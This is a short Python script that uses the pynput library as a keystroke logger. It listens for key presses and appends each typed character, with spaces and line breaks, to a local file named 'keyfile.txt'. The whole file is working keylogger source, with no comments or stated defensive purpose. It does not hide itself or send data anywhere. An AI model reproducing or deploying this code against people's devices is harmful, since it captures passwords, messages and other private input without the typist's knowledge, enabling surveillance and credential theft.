from pynput import keyboard

def on_press(key):
    with open("keyfile.txt", 'a') as logKey:
      try:
        logKey.write(key.char)
      except AttributeError:
        if key == keyboard.Key.space:
            logKey.write(' ')
        elif key == keyboard.Key.enter:
            logKey.write('\n')


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    input()
